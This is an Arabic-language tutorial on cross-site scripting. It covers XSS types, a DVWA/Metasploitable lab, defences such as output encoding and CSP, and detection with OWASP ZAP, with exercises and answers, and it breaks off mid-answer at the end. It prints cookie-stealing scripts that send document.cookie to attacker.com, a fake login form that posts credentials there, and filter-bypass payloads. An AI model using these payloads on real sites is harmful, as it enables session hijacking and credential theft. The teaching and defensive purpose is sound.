
      __  __            _    _               _             
     |  \/  | __ _ _ __| | _| |__   ___  ___| | _____ _ __ 
     | |\/| |/ _` | '__| |/ / '_ \ / _ \/ __| |/ / _ \ '__|
     | |  | | (_| | |  |   <| | | |  __/\__ \   <  __/ |   
     |_|  |_|\__,_|_|  |_|\_\_| |_|\___||___/_|\_\___|_|   
                                                          
  [ HACK THE PLANET ]   [ STAY LEGAL ⚠️ ]   [ OWN THE SYSTEM ]





# درس شامل حول هجمات XSS واكتشافها باستخدام OWASP ZAP

## 📑 فهرس المحتويات
1. [مقدمة عن XSS](#مقدمة-عن-xss)
2. [أنواع XSS](#أنواع-xss)
3. [كيفية استغلال XSS (أمثلة عملية)](#كيفية-استغلال-xss)
4. [بيئة الاختبار – Metasploitable](#بيئة-الاختبار--metasploitable)
5. [استراتيجيات الحماية من XSS](#استراتيجيات-الحماية-من-xss)
6. [مقدمة عن OWASP ZAP](#مقدمة-عن-owasp-zap)
7. [كيفية استخدام OWASP ZAP لاكتشاف XSS](#كيفية-استخدام-owasp-zap-لاكتشاف-xss)
8. [دمج OWASP ZAP في CI/CD](#دمج-owasp-zap-في-cicd)
9. [خاتمة تحفيزية](#خاتمة-تحفيزية)

## مقدمة عن XSS

### ما هو XSS؟
Cross-Site Scripting (XSS) هو نوع من هجمات الأمان التي تستهدف تطبيقات الويب، حيث يقوم المهاجم بحقن شيفرات JavaScript خبيثة في صفحات الويب التي يراها المستخدمون الآخرون. عندما يتم تنفيذ هذه الشيفرات في متصفح الضحية، يمكنها سرقة معلومات مثل جلسات تسجيل الدخول (الكوكيز)، أو تغيير محتوى الموقع، أو إعادة توجيه المستخدم إلى مواقع أخرى.

### لماذا تعتبر XSS خطيرة؟
1. يمكن أن تؤدي إلى سرقة هوية المستخدم
2. تسمح للمهاجم بتشغيل شيفرات برمجية في سياق جلسة المستخدم
3. يمكن استخدامها لنشر البرمجيات الخبيثة
4. تستطيع تعديل محتوى صفحات الويب التي يراها المستخدم
5. تحتل المرتبة الثالثة في قائمة OWASP Top 10 للتهديدات الأمنية

### ASCII Art تمثيل XSS

```
+----------------+       +------------------+        +----------------+
|                |       |                  |        |                |
|    المهاجم     | -----> |   موقع مصاب     | ------> |   الضحية      |
|                |       |                  |        |                |
+----------------+       +------------------+        +----------------+
     |                                                      |
     |           حقن شيفرة JavaScript خبيثة                  |
     |                                                      V
     |                  +------------------------+          |
     +----------------> |  تنفيذ الشيفرة الخبيثة  | <--------+
                        |  في متصفح الضحية      |
                        +------------------------+
```

### تمرين بسيط للمقدمة
**السؤال**: ما هي المعلومات التي يمكن للمهاجم الحصول عليها من خلال هجوم XSS ناجح؟ اذكر ثلاثة أمثلة.

**الإجابة المتوقعة**: 
1. بيانات جلسة المستخدم (الكوكيز)
2. بيانات النماذج (كلمات المرور، أرقام بطاقات الائتمان)
3. تصفح المستخدم وتفاعلاته مع الموقع

## أنواع XSS

### 1. Reflected XSS (الانعكاسي)
هذا النوع يحدث عندما يتم إرسال البيانات الخبيثة إلى خادم الويب، ثم يتم "عكسها" مباشرة في استجابة الخادم دون أي معالجة أو تحقق. مثال شائع هو عندما يتم إدخال الشيفرة الخبيثة في استعلام بحث أو نموذج ويب.

**مثال بسيط**:
```
https://example.com/search?q=<script>alert('XSS')</script>
```

إذا قام الموقع بعرض مصطلح البحث دون ترميز الأحرف الخاصة، سيتم تنفيذ السكريبت في متصفح المستخدم.

### 2. Stored XSS (المخزن)
في هذا النوع، يتم تخزين الشيفرة الخبيثة بشكل دائم على الموقع المستهدف (مثل قاعدة البيانات)، ثم يتم استرجاعها وتنفيذها لاحقاً عندما يزور المستخدمون الصفحة المصابة. هذا النوع أكثر خطورة لأنه يؤثر على جميع زوار الصفحة.

**مثال**:
تعليق في منتدى يحتوي على شيفرة JavaScript خبيثة:
```
مرحباً، تعليق رائع!
<script>
  let stolenCookie = document.cookie;
  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(stolenCookie));
</script>
```

### 3. DOM-based XSS (المعتمد على DOM)
يحدث هذا النوع عندما يتم تنفيذ الشيفرة الخبيثة من خلال تعديل بنية DOM للصفحة في المتصفح، دون أي تفاعل مع الخادم. يستخدم هذا النوع غالباً JavaScript على جانب العميل لمعالجة البيانات غير الموثوقة.

**مثال**:
```javascript
// شيفرة جافاسكريبت على الموقع
const username = location.hash.substring(1); // من URL #fragment
document.getElementById("greeting").innerHTML = "مرحباً، " + username;
```

إذا قام المستخدم بزيارة الموقع بـ URL مثل:
```
https://example.com/page#<img src=x onerror=alert('XSS')>
```
سيتم تنفيذ الشيفرة الخبيثة عند تحميل الصفحة.

### تمثيل ASCII لأنواع XSS

```
1. Reflected XSS:
مستخدم --------> خادم --------> مستخدم (نفسه)
(يرسل شيفرة)     (يعكسها)       (ينفذ السكريبت)

2. Stored XSS:
مهاجم --------> خادم <-------- ضحايا متعددة
(يرسل شيفرة)    (يخزنها)        (ينفذون السكريبت)

3. DOM-based XSS:
مستخدم --> متصفح --> DOM --> سكريبت
(يدخل شيفرة)   (يعالجها محلياً بدون الخادم)
```

### تمرين أنواع XSS
**السؤال**: أي نوع من XSS يعتبر الأكثر خطورة ولماذا؟

**الإجابة المتوقعة**: 
النوع المخزن Stored XSS هو الأكثر خطورة لأنه يؤثر على جميع المستخدمين الذين يزورون الصفحة المصابة، وليس فقط مستخدم واحد. كما أنه دائم ويمكن أن يستمر لفترة طويلة حتى يتم اكتشافه.

## كيفية استغلال XSS

### أساسيات الاستغلال
لفهم كيف يتم استغلال ثغرات XSS، سنبدأ بأمثلة بسيطة ثم ننتقل إلى سيناريوهات أكثر تعقيداً.

#### مثال 1: تنبيه بسيط للتحقق من الثغرة
```html
<script>alert('XSS');</script>
```
هذا هو أبسط اختبار للتحقق من وجود ثغرة XSS. إذا تم تنفيذ الشيفرة، سيظهر مربع تنبيه على المتصفح.

#### مثال 2: سرقة كوكيز جلسة المستخدم
```html
<script>
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```
تقوم هذه الشيفرة بإرسال كوكيز المستخدم إلى خادم المهاجم.

#### مثال 3: تزييف نموذج تسجيل الدخول
```html
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:white; z-index:1000;">
  <h3>انتهت جلستك، الرجاء إعادة تسجيل الدخول</h3>
  <form action="https://attacker.com/steal" method="post">
    اسم المستخدم: <input type="text" name="username"><br>
    كلمة المرور: <input type="password" name="password"><br>
    <input type="submit" value="تسجيل الدخول">
  </form>
</div>
```
هذه الشيفرة تعرض نموذج تسجيل دخول مزيف يرسل البيانات إلى خادم المهاجم.

### تجاوز تقنيات الحماية

#### تجاوز فلترة العلامات `<script>`
```html
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
```

#### استخدام التشفير وترميز الأحرف
```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));</script>
```
هذا يعادل `alert('XSS')` لكن باستخدام ترميز ASCII للأحرف.

#### استخدام JavaScript URI
```html
<a href="javascript:alert('XSS')">انقر هنا</a>
```

### أدوات مفيدة لاختبار XSS
1. **XSS Hunter**: أداة متقدمة لاكتشاف وتحليل ثغرات XSS
2. **BeEF (Browser Exploitation Framework)**: إطار عمل لاستغلال ثغرات المتصفح
3. **OWASP ZAP**: سنتحدث عنه بالتفصيل لاحقاً

### تمرين استغلال XSS
**السؤال**: اكتب شيفرة XSS تقوم بتغيير جميع الصور في الصفحة إلى صورة أخرى (بدون استخدام علامة `<script>` مباشرة).

**الإجابة المتوقعة**:
```html
<img src="x" onerror="document.querySelectorAll('img').forEach(img => img.src = 'https://example.com/new-image.jpg')">
```

## بيئة الاختبار – Metasploitable

Metasploitable هي بيئة لينكس متعمدة الضعف أمنياً مصممة للتدريب على اختبار الاختراق وفحص الأمان. تتضمن العديد من التطبيقات الضعيفة التي يمكن استخدامها لممارسة اكتشاف واستغلال ثغرات XSS.

### إعداد بيئة Metasploitable
1. قم بتنزيل صورة Metasploitable من الموقع الرسمي
2. قم بتثبيتها على نظام افتراضي مثل VirtualBox أو VMware
3. شغل الجهاز الافتراضي وسجل الدخول (اسم المستخدم وكلمة المرور الافتراضية هي `msfadmin`)

### تطبيقات ضعيفة للاختبار
1. **DVWA (Damn Vulnerable Web Application)**
   - تطبيق ويب متعمد الضعف بمستويات متعددة من الصعوبة
   - يمكن الوصول إليه عبر `http://[IP-Metasploitable]/dvwa/`

2. **Mutillidae**
   - تطبيق ويب ضعيف آخر يتضمن ثغرات OWASP Top 10
   - يمكن الوصول إليه عبر `http://[IP-Metasploitable]/mutillidae/`

### خطوات اختبار XSS في DVWA
1. تسجيل الدخول باستخدام `admin/password`
2. اختر "XSS (Reflected)" أو "XSS (Stored)" من القائمة
3. قم بتعيين مستوى الصعوبة إلى "Low" للبداية
4. استخدم الأمثلة المذكورة سابقاً لاختبار الثغرات

### خطوات اختبار XSS في Mutillidae
1. انتقل إلى "OWASP Top 10" > "A7 - Cross Site Scripting"
2. اختر أحد التمارين المتاحة مثل "DNS Lookup" أو "Add to your blog"
3. استخدم مختلف تقنيات XSS للاختبار

### تمرين بيئة الاختبار
**السؤال**: في DVWA، ما الفرق بين مستويات الصعوبة المختلفة (Low, Medium, High) في أمان XSS؟

**الإجابة المتوقعة**:
- **Low**: لا يوجد ترميز أو تصفية للمدخلات
- **Medium**: بعض الترميز البسيط أو استخدام تعبيرات منتظمة لمنع بعض الهجمات
- **High**: ترميز أكثر تعقيداً وتصفية أكثر صرامة تتطلب تقنيات متقدمة للتجاوز

## استراتيجيات الحماية من XSS

### 1. ترميز المخرجات (Output Encoding)
ترميز المخرجات هو الخط الدفاعي الأول ضد هجمات XSS. يعني تحويل الأحرف الخاصة مثل `<` و `>` و `"` و `'` إلى رموز HTML مثل `&lt;` و `&gt;` و `&quot;` و `&#x27;`.

```javascript
// مثال للترميز في JavaScript
function escapeHTML(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// في PHP
$escaped = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// في Java
String escaped = StringEscapeUtils.escapeHtml4(input);
```

### 2. استخدام مكتبات وإطارات عمل آمنة
معظم إطارات العمل الحديثة مثل React وAngular وVue.js تقوم بترميز المخرجات تلقائياً، مما يقلل من خطر XSS.

```javascript
// React يقوم بترميز المحتوى تلقائياً
const userInput = "<script>alert('XSS')</script>";
return <div>{userInput}</div>; // آمن بشكل افتراضي

// لكن يجب الحذر عند استخدام dangerouslySetInnerHTML
return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // خطير!
```

### 3. التحقق من صحة المدخلات (Input Validation)
تحقق دائماً من المدخلات قبل معالجتها، وخاصة عند التحقق من جانب الخادم.

```php
// مثال في PHP
function isValidInput($input) {
    // تحقق من أن المدخلات تحتوي فقط على أحرف وأرقام
    return preg_match('/^[a-zA-Z0-9]+$/', $input);
}

if (isValidInput($_POST['username'])) {
    // معالجة المدخلات
} else {
    // رفض المدخلات
}
```

### 4. استخدام سياسة أمان المحتوى (Content Security Policy - CSP)
CSP هي طبقة إضافية من الحماية تسمح لك بتحديد المصادر المسموح بها للمحتوى الذي يتم تحميله في صفحتك.

```html
<!-- إضافة CSP عبر وسم meta -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com;">

<!-- أو عبر HTTP header -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```

### 5. استخدام علامات HttpOnly وSecure للكوكيز
منع الوصول إلى الكوكيز عبر JavaScript يمكن أن يحميها من هجمات سرقة الجلسة.

```php
// مثال في PHP
setcookie("sessionid", $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

### تمرين استراتيجيات الحماية
**السؤال**: قدم مثالاً لسياسة أمان محتوى (CSP) تسمح بتشغيل السكريبتات فقط من الخادم الأصلي وخادم Google Analytics.

**الإجابة المتوقعة**:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://www.google-analytics.com;
```

## مقدمة عن OWASP ZAP

### ما هو OWASP ZAP؟
OWASP Zed Attack Proxy (ZAP) هو أداة فحص أمني مفتوحة المصدر تستخدم لاكتشاف الثغرات الأمنية في تطبيقات الويب. تم تطويره من قبل مشروع OWASP وهو أحد أكثر أدوات الفحص الأمني استخداماً بين المتخصصين.

### مميزات OWASP ZAP
1. اكتشاف آلي للثغرات الأمنية
2. وضع الاعتراض (Intercepting Proxy)
3. فحص السبايدر لاكتشاف الروابط والصفحات
4. مسح أمني نشط وسلبي
5. تحليل API وخدمات الويب
6. برمجة سكريبتات للفحص المخصص
7. محرك قواعد للكشف عن الثغرات
8. أداة فحص Fuzzing

### تثبيت OWASP ZAP
1. قم بتنزيل ZAP من الموقع الرسمي: [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
2. ثبت البرنامج حسب نظام التشغيل الخاص بك
3. شغل البرنامج وقم بتهيئة المتصفح لاستخدام ZAP كوسيط

```
+------------+       +-------------+       +---------------+
|            |       |             |       |               |
| المتصفح    | <---> |  OWASP ZAP  | <---> | موقع الهدف    |
|            |       |             |       |               |
+------------+       +-------------+       +---------------+
                           |
                           V
                    +-------------+
                    | تقرير أمني  |
                    +-------------+
```

### واجهة المستخدم الرئيسية لـ ZAP
1. **Sites Tab**: يعرض الهيكل الهرمي للمواقع التي تم فحصها
2. **Request/Response Tabs**: عرض الطلبات والاستجابات
3. **Spider**: لاستكشاف الموقع المستهدف
4. **Active Scan**: للبحث عن الثغرات بنشاط
5. **Alerts Tab**: لعرض التحذيرات والثغرات المكتشفة

### تمرين مقدمة OWASP ZAP
**السؤال**: ما الفرق بين الفحص النشط (Active Scan) والفحص السلبي (Passive Scan) في ZAP؟

**الإجابة المتوقعة**:
- **الفحص السلبي**: يراقب حركة المرور بين المتصفح والخادم دون إرسال طلبات إضافية. آمن ولا يؤثر على الموقع.
- **الفحص النشط**: يرسل طلبات إضافية محتملة الضرر للكشف عن الثغرات. أكثر شمولية لكنه يمكن أن يؤثر على الموقع المستهدف.

## كيفية استخدام OWASP ZAP لاكتشاف XSS

### الإعداد الأولي
1. قم بتشغيل ZAP وتكوين المتصفح لاستخدام ZAP كوسيط
2. أدخل عنوان URL للموقع المراد فحصه في مربع الـ "Quick Start"
3. انقر على "Attack" للبدء بالفحص الأساسي

### طريقة الفحص اليدوي للـ XSS
1. استخدم أداة Spider لاكتشاف صفحات الموقع
   ```
   Sites → Right-click on target site → Attack → Spider
   ```

2. حدد النماذج والمعلمات التي تريد اختبارها
   ```
   Sites → Expand target site → Find a form or parameter
   ```

3. استخدم وضع الاعتراض (Intercept) لاختبار الثغرات يدوياً
   ```
   Tools → Options → Breakpoints → Set breakpoints on all requests/responses
   ```

4. أدخل أكواد XSS في الحقول وتحقق من الردود

### استخدام الفحص النشط للـ XSS
1. قم بتفعيل سياسات الفحص النشط للـ XSS
   ```
   Scan Policy Manager → New → Check "Cross Site Scripting (Reflected)" and "Cross Site Scripting (Stored)"
   ```

2. ابدأ الفحص النشط
   ```
   Sites → Right-click on target site → Attack → Active Scan
   ```

3. راجع نتائج الفحص في علامة التبويب "Alerts"

### استخدام أداة Fuzzer
1. اعترض طلب يحتوي على معلمة قد تكون عرضة للـ XSS
2. انقر بزر الماوس الأيمن على الطلب → "Fuzz"
3. حدد المعلمة التي تريد اختبارها
4. أضف قائمة Fuzz من القوائم الجاهزة أو أنشئ قائمة مخصصة بأكواد XSS
   ```
   Add → File Fuzzers → select "jbrofuzz/xss"
   ```
5. انقر على "Start Fuzzer" وتحقق من النتائج

### كتابة سكريبتات مخصصة للكشف عن XSS
يمكنك كتابة سكريبتات Python أو JavaScript مخصصة للكشف عن ثغرات XSS غير التقليدية:

```javascript
// مثال لسكريبت JavaScript في ZAP
function scan(as, msg, param, value) {
    // حقن كود XSS مخصص
    var customXss = '<img src=x onerror=alert("CUSTOM_XSS_' + param + '")>';
    
    // إرسال طلب اختبار
    var testMsg = msg.cloneRequest();
    as.setParam(testMsg, param, customXss);
    
    // إرسال الطلب وفحص الاستجابة
    as.sendAndReceive(testMsg);
    var response = testMsg.getResponseBody().toString();
    
    // التحقق مما إذا كان الكود موجوداً في الاستجابة دون ترميز
    if (response.indexOf('CUSTOM_XSS_' + param) > 0) {
        as.raiseAlert(AlertRisk.HIGH, AlertConfidence.MEDIUM,
            'Custom XSS vulnerability',
            'تم العثور على ثغرة XSS مخصصة في المعلمة: ' + param,
            msg.getRequestHeader().getURI().toString(),
            param, customXss, '',
            'تحقق من ترميز المخرجات لهذه المعلمة',
            '', msg);
    }
    
    return;
}
```

### تفسير نتائج الفحص
1. افتح علامة التبويب "Alerts" لعرض التحذيرات
2. افحص تفاصيل كل تحذير XSS:
   - المعلمة المصابة
   - نوع الثغرة (Reflected, Stored, DOM)
   - خطورة الثغرة
   - الرمز المستخدم في الهجوم
3. تحقق من صحة الثغرة بمعاينة الطلب والاستجابة

### تمرين OWASP ZAP لاكتشاف XSS
**السؤال**: قم بوصف الخطوات التي ستتبعها لفحص موقع DVWA للكشف عن ثغرات XSS باستخدام OWASP ZAP.

**الإجابة المتوقعة**:
1. تشغيل ZAP وتكوين المتصفح لاستخدامه كوسيط
2. تسجيل الدخول إلى DVWA يدوياً (المصادقة)
3. انتقل إلى صفحة XSS في DVWA
4. استخدم Spider لاستكشاف جميع صفحات الموقع
5. قم بإعداد وتفعيل سياسة فحص نشط تركز على XSS
6. ابدأ الفحص النشط على الموقع
7. للتأكد من النتائج، استخدم أداة Fuzzer على المعلمات المشتبه بها
8. راجع النتائج في تبويب التحذيرات و
